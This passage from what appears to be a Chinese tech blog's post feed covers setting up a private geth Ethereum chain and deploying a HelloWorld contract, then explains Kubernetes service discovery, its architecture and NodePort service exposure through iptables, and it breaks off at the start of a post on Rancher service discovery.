<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.accounts</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">[<span class="string">&quot;0xa9cb6db62d6673ae5cd79d0d29796dd9df1d1a5e&quot;</span>]</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">personal.newAccount()</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Passphrase:</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Repeat passphrase:</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="string">&quot;0x00e70f2bd5a644cdf4432f886bf25473cbe620ac&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.accounts</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">[<span class="string">&quot;0xa9cb6db62d6673ae5cd79d0d29796dd9df1d1a5e&quot;</span>, <span class="string">&quot;0x00e70f2bd5a644cdf4432f886bf25473cbe620ac&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>若不解锁用户，部署会提示错误<code>creation of HelloWorld errored: authentication needed: password or unlock</code>。解锁用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">personal.unlockAccount(eth.accounts[1])</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Unlock account 0x00e70f2bd5a644cdf4432f886bf25473cbe620ac</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Passphrase:</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="literal">true</span></span></span><br></pre></td></tr></table></figure>

<h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><p>使用<code>miner.start()</code>开始挖矿；使用<code>miner.stop()</code>停止挖矿。</p>
<p>开始挖矿后，当出现如下日志信息时，说明挖到了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">INFO [11-07|17:59:54.021] Successfully sealed new block            number=1 sealhash=84eaaa..f4d2c5 hash=925c9a..d8cb75 elapsed=1h30m51.894s</span><br><span class="line">INFO [11-07|17:59:54.022] 🔨 mined potential block                  number=1 hash=925c9a..d8cb75</span><br><span class="line">INFO [11-07|17:59:54.026] Commit new sealing work                  number=2 sealhash=865003..0e32da uncles=0 txs=0 gas=0 fees=0 elapsed=1.991ms</span><br><span class="line">INFO [11-07|17:59:54.027] Commit new sealing work                  number=2 sealhash=865003..0e32da uncles=0 txs=0 gas=0 fees=0 elapsed=3.070ms</span><br><span class="line">INFO [11-07|17:59:54.428] Generating DAG in progress               epoch=1 percentage=0  elapsed=3.563s</span><br><span class="line">INFO [11-07|17:59:56.581] Successfully sealed new block            number=2 sealhash=865003..0e32da hash=f1224d..9dc4b8 elapsed=2.554s</span><br><span class="line">INFO [11-07|17:59:56.582] 🔨 mined potential block                  number=2 hash=f1224d..9dc4b8</span><br><span class="line">INFO [11-07|17:59:56.584] Commit new sealing work                  number=3 sealhash=8de6d6..c8886e uncles=0 txs=0 gas=0 fees=0 elapsed=&quot;906.417µs&quot;</span><br><span class="line">INFO [11-07|17:59:56.585] Commit new sealing work                  number=3 sealhash=8de6d6..c8886e uncles=0 txs=0 gas=0 fees=0 elapsed=2.271ms</span><br><span class="line">INFO [11-07|17:59:57.730] Successfully sealed new block            number=3 sealhash=8de6d6..c8886e hash=42a018..4e7ef3 elapsed=1.146s</span><br><span class="line">INFO [11-07|17:59:57.731] 🔨 mined potential block                  number=3 hash=42a018..4e7ef3</span><br><span class="line">INFO [11-07|17:59:57.733] Commit new sealing work                  number=4 sealhash=26af07..609e57 uncles=0 txs=0 gas=0 fees=0 elapsed=1.165ms</span><br></pre></td></tr></table></figure>

<p>此时使用<code>eth.blockNumber</code>可以查看到当前区块数量，使用<code>eth.getBalance(eth.accounts[0])</code>查看默认用户余额，同理使用<code>eth.getBalance(eth.accounts[1])</code>查看我们创建的用户的余额。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.getBalance(eth.accounts[0])</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">25000000000000000000</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.getBalance(eth.accounts[1])</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">0</span></span><br></pre></td></tr></table></figure>

<p>挖到的奖励都进了默认账户了，我们新建的账户里木有哦。来给我转账吧，嘿嘿嘿….</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.sendTransaction(&#123;from:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,<span class="string">&#x27;ether&#x27;</span>)&#125;)</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="string">&quot;0x244da771baf2bd65e5e040c33ee3047b57a2492b85d271564bc90ccd7cb4fa46&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">eth.getBalance(eth.accounts[1])</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">5000000000000000000</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">&gt; eth.getBalance(eth.accounts[0])</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1.535e+21</span></span><br></pre></td></tr></table></figure>

<p>哇哦，又挖到矿了。</p>
<h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><p>环境搭建好了，现在开始编写智能合约。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// compiler version must be greater than or equal to 0.8.13 and less than 0.9.0</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.13;</span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">    function sayHelloWorld() public returns (string memory) &#123;</span><br><span class="line">        return &quot;Hello World&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Remix"><a href="#Remix" class="headerlink" title="Remix"></a>Remix</h2><p>在这里获<a href="https://remix-project.org/">Remix</a></p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><img src="/images/blockchain/solidity_remix_compile.jpg" alt="solidity_remix_compile"></p>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>点击部署，然后选择外部http provider，并配置我们搭建好的ethereum服务。</p>
<p><img src="/images/blockchain/solidity_remix_deploy_setting_1.jpg" alt="solidity_remix_deploy_setting_1.jpg"></p>
<p><img src="/images/blockchain/solidity_remix_deploy_setting_2.jpg" alt="solidity_remix_deploy_setting_2.jpg"></p>
<p>接下中，选择我们创建好的账户，然后进行部署。</p>
<p><img src="/images/blockchain/solidity_remix_deploy.jpg" alt="solidity_remix_deploy.jpg"></p>
<p><img src="/images/blockchain/solidity_remix_deploy_log.jpg" alt="solidity_remix_deploy_log.jpg"></p>
<h2 id="执行智能合约"><a href="#执行智能合约" class="headerlink" title="执行智能合约"></a>执行智能合约</h2><p>执行智能合约可以选择在Remix中执行，也可选择attach到eth_server控制台执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">abi =[&#123;<span class="string">&quot;inputs&quot;</span>:[],<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sayHelloWorld&quot;</span>,<span class="string">&quot;outputs&quot;</span>:[&#123;<span class="string">&quot;internalType&quot;</span>:<span class="string">&quot;string&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>&#125;],<span class="string">&quot;stateMutability&quot;</span>:<span class="string">&quot;nonpayable&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;function&quot;</span>&#125;]</span></span><br><span class="line">[&#123;</span><br><span class="line">    inputs: [],</span><br><span class="line">    name: &quot;sayHelloWorld&quot;,</span><br><span class="line">    outputs: [&#123;</span><br><span class="line">        internalType: &quot;string&quot;,</span><br><span class="line">        name: &quot;&quot;,</span><br><span class="line">        type: &quot;string&quot;</span><br><span class="line">    &#125;],</span><br><span class="line">    stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">    type: &quot;function&quot;</span><br><span class="line">&#125;]</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">hello=eth.contract(abi).at(<span class="string">&#x27;0xCB1B01B40CD752F5d42f5b8dCeE4BE2A637CaAf2&#x27;</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  abi: [&#123;</span><br><span class="line">      inputs: [],</span><br><span class="line">      name: &quot;sayHelloWorld&quot;,</span><br><span class="line">      outputs: [&#123;...&#125;],</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  address: &quot;0xCB1B01B40CD752F5d42f5b8dCeE4BE2A637CaAf2&quot;,</span><br><span class="line">  transactionHash: null,</span><br><span class="line">  allEvents: function bound(),</span><br><span class="line">  sayHelloWorld: function bound()</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">hello.sayHelloWorld.call()</span></span><br><span class="line">&quot;Hello World&quot;</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/6e739550a349">智能合约 hello world</a></li>
<li><a href="https://haofly.net/geth/">Geth 搭建私链 private blockchain</a></li>
<li><a href="https://blog.csdn.net/weixin_42822207/article/details/120620731">【geth】Go语言调用智能合约 | 一起来学区块链</a></li>
</ul>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>K8s服务发现分析</title>
    <url>/2017/04/27/container/k8s/k8s-analyze-service-discovery/</url>
    <content><![CDATA[<h1 id="什么是服务发现"><a href="#什么是服务发现" class="headerlink" title="什么是服务发现"></a>什么是服务发现</h1><p>容器可以对其它容器提供服务，如mysql（数据库服务）、nginx、mangodb等等。这些服务都可以通过IP＋Port方式访问。由于容器会经常重建迁移，所以IP会发生变化，如果调用服务的程序使用IP访问就会很不方便，为此可以使用DNS、zookeeper、etcd等技术实现服务访问与IP的解耦。这种解耦方式叫做服务发现。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>Kubernetes v1.4.0</li>
<li>kube-dns 1.9(image tag)</li>
</ul>
<h1 id="Kubernetes服务发现概述"><a href="#Kubernetes服务发现概述" class="headerlink" title="Kubernetes服务发现概述"></a>Kubernetes服务发现概述</h1><p><img src="/images/k8s/k8s-service-discovery.png" alt="k8s-service-discovery.png"></p>
<ul>
<li>Kube-dns 以容器的形式为K8s集群提供DNS服务</li>
<li>Etcd用于存储K8s中的服务、容器等信息，Kube-dns的数据也是从Etcd中获取的</li>
<li>healthz 监控DNS Pod中的Kube-dns、dnsmasq容器</li>
<li>dnsmasq以代理形式将外部访问转发给Kube-dns容器，走10053端口</li>
</ul>
<h1 id="Kube-dns"><a href="#Kube-dns" class="headerlink" title="Kube-dns"></a>Kube-dns</h1><p><img src="/images/k8s/k8s-kube-dns-analysis.png" alt="k8s-kube-dns-analysis.png"></p>
<ul>
<li>miekg监听10053端口，接收dnsmasq转发过来的DNS请求</li>
<li>KubeDNS中的Cache模块从Etcd中获取Service和Namespace信息，用户完成Service域名到Service地址的映射</li>
<li>SkyDNS Server 完成DNS协议交互逻辑<br>  该模块在KubeDNS启动时将自身注册到miekg中；并实现接口ServeDNS，当miekg收到DNS请求后，将调用该接口进行处理。</li>
<li>KubeDNS中模块实现了backend接口<br>  在ServeDNS处理DNS请求时，需要调用backend接口的Records和ReverseRecord method，backend接口会比对Cache中的内容，然后返回结果。</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.kubernetes.org.cn/542.html">Kubernetes（K8S）的服务发现和kube-dns插件</a></li>
<li><a href="https://www.kubernetes.org.cn/273.html">Kubernetes(k8s)如何使用kube-dns实现服务发现</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>k8s</tag>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes介绍</title>
    <url>/2017/01/31/container/k8s/k8s-introduce/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Kubernetes是为生产环境而设计的容器调度管理系统，对于负载均衡、服务发现、高可用、滚动升级、自动伸缩等容器云平台的功能要求有原生支持。由于Kubernetes在K和s间有8个字母，因此常简称K8s。事实上，随着对K8s系统架构与设计理念的了解深入，我们会发现K8s系统正是处处为运行云原生应用而设计考虑；同时，随着对K8s系统使用的加深和加广，也会有越来越多有关云原生应用的设计模式产生出来，使得基于K8s系统设计和开发生产级的复杂云原生应用变得像启动一个单机版容器服务那样简单易用。</p>
<h1 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h1><p>一个K8s集群是由etcd（分布式存储）、Minion&#x2F;node（服务节点）、Master（控制节点）构成的。集群状态都保存在etcd中，Master节点上则运行集群的管理控制模块，多个Master节点以Active&#x2F;Standby方式运行。Minion节点是真正运行应用容器的主机节点，在每个Minion节点上都会运行一个Kubelet代理，控制该节点上的容器、镜像和存储卷等。</p>
<p><img src="/images/k8s/k8s_frame.png" alt="k8s_frame"></p>
<h2 id="Master中模块"><a href="#Master中模块" class="headerlink" title="Master中模块"></a>Master中模块</h2><h3 id="API-Server"><a href="#API-Server" class="headerlink" title="API Server"></a>API Server</h3><pre><code>Kubernetes系统的入口，其封装了核心对象的增删改查操作，以RESTful API接口方式提供给外部客户和内部组件调用。维护的REST对象持久化到Etcd中存储。
</code></pre>
<h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><pre><code>为新建立的Pod进行节点选择(即分配机器)，负责集群的资源调度。组件抽离，可以方便替换成其他调度器。
</code></pre>
<h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><ul>
<li>Replication Controller(RC)<br>  保证定义的副本数量与实际运行Pod数量一致。</li>
<li>Node Controller<br>  管理维护Minion／node，定期检查Node的健康状态，标识出(失效|未失效)的节点。</li>
<li>Namespace Controller<br>  管理维护Namespace，定期清理无效的Namespace。</li>
<li>Service Controller<br>  Todo…</li>
<li>EndPoints Controller<br>  Todo…</li>
<li>Service Account Controller<br>  Todo…</li>
<li>Persistent Volume Controller<br>  Todo…</li>
<li>Daemon Set Controller<br>  管理维护Daemon Set，负责创建Daemon Pod，保证指定的Node上正常的运行Daemon Pod。</li>
<li>Deployment Controller<br>  Todo…</li>
<li>Job Controller<br>  管理维护Job，为Jod创建一次性任务Pod，保证完成Job指定完成的任务数目</li>
<li>Pod Autoscaler Controller<br>  实现Pod的自动伸缩，定时获取监控数据，进行策略匹配，当满足条件时执行Pod的伸缩动作。</li>
</ul>
<h2 id="Minion中模块"><a href="#Minion中模块" class="headerlink" title="Minion中模块"></a>Minion中模块</h2><h3 id="Kubelet"><a href="#Kubelet" class="headerlink" title="Kubelet"></a>Kubelet</h3><p>负责管控容器，Kubelet会从Kubernetes API Server接收Pod的创建请求，启动和停止容器，监控容器运行状态并汇报给Kubernetes API Server。</p>
<h3 id="Kube-proxy"><a href="#Kube-proxy" class="headerlink" title="Kube proxy"></a>Kube proxy</h3><p>Kube-proxy是K8s集群内部的负载均衡器。它是一个分布式代理服务器，在K8s的每个节点上都有一个；这一设计体现了它的伸缩性优势，需要访问服务的节点越多，提供负载均衡能力的Kube-proxy就越多，高可用节点也随之增多。</p>
<h3 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h3><p>Pod是在K8s集群中运行部署应用或服务的最小单元，它是可以支持多容器的。Pod的设计理念是支持多个容器在一个Pod中共享网络地址和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务。Pod对多容器的支持是K8最基础的设计理念。Pod是K8s集群中所有业务类型的基础，目前K8s中的业务主要可以分为长期伺服型（long-running）、批处理型（batch）、节点后台支撑型（node-daemon）和有状态应用型（stateful application），分别对应控制器为Deployment Controller、Job Controller、Daemon Set Controller、Pet Set Controller</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/horsefoot/article/details/52221706">Kubernetes的系统架构与设计理念</a></li>
<li><a href="http://www.cnblogs.com/xkops/p/6165565.html">k8s入门系列之介绍篇</a></li>
<li><a href="http://www.cnblogs.com/jianyuan/p/5063530.html">Docker系列(八)Kubernetes介绍</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s service expose</title>
    <url>/2017/03/29/container/k8s/k8s-service-expose/</url>
    <content><![CDATA[<p>从<code>k8s 1.2</code>版本开始提供Ingress来实现对外暴露服务；目前k8s有三种暴露方式</p>
<ul>
<li>LoadBlancer Service</li>
<li>NodePort Service</li>
<li>Ingress</li>
</ul>
<h1 id="K8s-LBS"><a href="#K8s-LBS" class="headerlink" title="K8s-LBS"></a>K8s-LBS</h1><p>LBS是k8s与云平台深度结合的一个组件，当使用LBS暴露服务时，实际上是通过底层云平台申请创建一个负载均衡器来向外暴露服务。目前LBS支持的云平台有GCE、DigitalOcean、Aliyun、私有云Openstack等等，由于LBS与云平台深度结合，所以只能在这些平台上使用。</p>
<h1 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h1><p><img src="/images/k8s/k8s_nodeport.png" alt="k8s_nodeport"></p>
<p>k8s的端口分为：</p>
<ul>
<li>Port<br>  service上暴露出来的端口，提供给集群(集群指整个容器集群)内部客户访问的端口。</li>
<li>NodePort<br>  node上暴露的端口，提供给集群外部客户访问的端口。</li>
<li>TargetPort<br>  endpoint上暴露的端口，也可以当作Pod上暴露的端口，无论从Port或NodePort上来的数据最终都会经过kube-proxy转发到Pod的TargetPort端口上。</li>
</ul>
<p>k8s的IP分为：</p>
<ul>
<li>ClusterIP<br>  service上虚拟ip地址，它由kube-proxy使用iptables规则重新定向到本地端口，再均衡到后端的Pod上。</li>
<li>NodeIP<br>  node节点的物理ip地址，它被kube-proxy使用iptables规则重定向到本地端口。</li>
<li>ContainerIP&#x2F;PodIP<br>  K8s中以Pod为最小部署单位，一个Pod中共享一个网络资源（无论Pod中有几个容器）。每个Pod启动时，会自动创建一个镜像为gcr.io&#x2F;google_containers&#x2F;pause:0.8.0的容器，容器内部与外部的通信经由此容器代理，所以ContainerIP就是PodIP。</li>
</ul>
<h2 id="暴露方法及API"><a href="#暴露方法及API" class="headerlink" title="暴露方法及API"></a>暴露方法及API</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">svc-1</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">svc-1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">2222</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">22</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">30022</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">rc-test</span></span><br></pre></td></tr></table></figure>

<p><a href="https://kubernetes.io/docs/api-reference/v1.5/#service-v1">API操作</a></p>
<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>ip地址及端口的暴露都是通过修改iptables规则来实现的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">iptables -t nat -L -n</span></span><br><span class="line">...</span><br><span class="line">Chain KUBE-NODEPORTS (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-lonely: */ tcp dpt:30023</span><br><span class="line">KUBE-SVC-E6FDK4HG4F4JSB77  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-lonely: */ tcp dpt:30023</span><br><span class="line">KUBE-MARK-MASQ  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-tmp: */ tcp dpt:30099</span><br><span class="line">KUBE-SVC-OOWDNB3NCXKPBPZE  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-tmp: */ tcp dpt:30099</span><br><span class="line">KUBE-MARK-MASQ  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp dpt:30022</span><br><span class="line">KUBE-SVC-D25WXD2YSOVKEUTU  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp dpt:30022</span><br><span class="line">...</span><br><span class="line">Chain KUBE-SEP-2LNK4QUGPB2C5PDO (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  192.168.6.110        0.0.0.0/0            /* default/kubernetes:https */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/kubernetes:https */ recent: SET name: KUBE-SEP-2LNK4QUGPB2C5PDO side: source mask: 255.255.255.255 tcp to:192.168.6.110:6443</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-5GTCHBFJM5RAI7LS (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.9          0.0.0.0/0            /* default/svc-lonely: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-lonely: */ tcp to:10.254.86.9:22</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-BCYRFQ26LZTOSSU7 (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.4          0.0.0.0/0            /* default/svc-1: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp to:10.254.86.4:22</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-CLKUH4WMQ3CNBJ7K (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.2          0.0.0.0/0            /* default/svc-1: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp to:10.254.86.2:22</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-D3FORTYMXA7BVSDA (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.8          0.0.0.0/0            /* default/svc-1: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp to:10.254.86.8:22</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-F4EJGNTAH3JOOQC6 (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.3          0.0.0.0/0            /* default/svc-1: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ tcp to:10.254.86.3:22</span><br><span class="line"></span><br><span class="line">Chain KUBE-SEP-HO23WAVQKIB2R4KD (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  10.254.86.10         0.0.0.0/0            /* default/svc-tmp: */</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-tmp: */ tcp to:10.254.86.10:99</span><br><span class="line"></span><br><span class="line">Chain KUBE-SERVICES (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SVC-E6FDK4HG4F4JSB77  tcp  --  0.0.0.0/0            10.254.162.24        /* default/svc-lonely: cluster IP */ tcp dpt:2223</span><br><span class="line">KUBE-SVC-OOWDNB3NCXKPBPZE  tcp  --  0.0.0.0/0            10.254.119.86        /* default/svc-tmp: cluster IP */ tcp dpt:9999</span><br><span class="line">KUBE-SVC-NPX46M4PTMTKRN6Y  tcp  --  0.0.0.0/0            10.254.0.1           /* default/kubernetes:https cluster IP */ tcp dpt:443</span><br><span class="line">KUBE-SVC-D25WXD2YSOVKEUTU  tcp  --  0.0.0.0/0            10.254.159.12        /* default/svc-1: cluster IP */ tcp dpt:2222</span><br><span class="line">KUBE-NODEPORTS  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL</span><br><span class="line"></span><br><span class="line">Chain KUBE-SVC-D25WXD2YSOVKEUTU (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SEP-CLKUH4WMQ3CNBJ7K  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ statistic mode random probability 0.25000000000</span><br><span class="line">KUBE-SEP-F4EJGNTAH3JOOQC6  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ statistic mode random probability 0.33332999982</span><br><span class="line">KUBE-SEP-BCYRFQ26LZTOSSU7  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */ statistic mode random probability 0.50000000000</span><br><span class="line">KUBE-SEP-D3FORTYMXA7BVSDA  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-1: */</span><br><span class="line"></span><br><span class="line">Chain KUBE-SVC-E6FDK4HG4F4JSB77 (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SEP-5GTCHBFJM5RAI7LS  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-lonely: */</span><br><span class="line"></span><br><span class="line">Chain KUBE-SVC-NPX46M4PTMTKRN6Y (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SEP-2LNK4QUGPB2C5PDO  all  --  0.0.0.0/0            0.0.0.0/0            /* default/kubernetes:https */ recent: CHECK seconds: 180 reap name: KUBE-SEP-2LNK4QUGPB2C5PDO side: source mask: 255.255.255.255</span><br><span class="line">KUBE-SEP-2LNK4QUGPB2C5PDO  all  --  0.0.0.0/0            0.0.0.0/0            /* default/kubernetes:https */</span><br><span class="line"></span><br><span class="line">Chain KUBE-SVC-OOWDNB3NCXKPBPZE (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SEP-HO23WAVQKIB2R4KD  all  --  0.0.0.0/0            0.0.0.0/0            /* default/svc-tmp: */</span><br></pre></td></tr></table></figure>

<h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress"></a>Ingress</h1><p>Todo…</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.colabug.com/thread-1703745-1-1.html?pp=2">Traefik-kubernetes 初试</a></li>
<li><a href="http://blog.163.com/hk_bs/blog/static/245038011201611149254899/">Kubernetes 中的PodIP、ClusterIP 和外部IP</a></li>
<li><a href="http://blog.csdn.net/xinghun_4/article/details/50492041">kubernetes中port、target port、node port的对比分析，以及kube-proxy代理</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>Rancher服务发现分析</title>
    <url>/2017/03/01/container/rancher/rancher-dns-and-metadata/</url>
    <content><![CDATA[<h1 id="什么是服务发现"><a href="#什么是服务发现" class="headerlink" title="什么是服务发现"></a>什么是服务发现</h1><p>容器可以对其它容器提供服务，如mysql（数据库服务）、nginx、mangodb等等。这些服务都可以通过IP＋Port方式访问。由于容器会经常重建迁移，所以IP会发生变化，如果调用服务的程序使用IP访问就会很不方便，为此可以使用DNS、zookeeper、etcd等技术实现服务访问与IP的解耦。这种解耦方式叫做服务发现。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>rancher-dns v0.13.3</li>
</ul>
<h1 id="Rancher服务发现构成及更新流程"><a href="#Rancher服务发现构成及更新流程" class="headerlink" title="Rancher服务发现构成及更新流程"></a>Rancher服务发现构成及更新流程</h1><p><img src="/images/rancher/rancher-dns-and-metadata.png" alt="rancher-dns-and-metadata"></p>
<ul>
<li>Cattle<br>  容器管理器（rancher核心）。</li>
<li>Event Subscriber<br>  轻量级的消息队列，用于通知rancher-metadata更新数据<br>  ** 猜测：采用websocket协议通讯，Cattle为消息生产者，rancher-metadata、scheduler、rancher-agent为消费者或消息订阅者 **</li>
<li>rancher-dns<br>  向容器提供DNS服务</li>
<li>rancher-metadata<br>  rancher中的元数据管理器</li>
</ul>
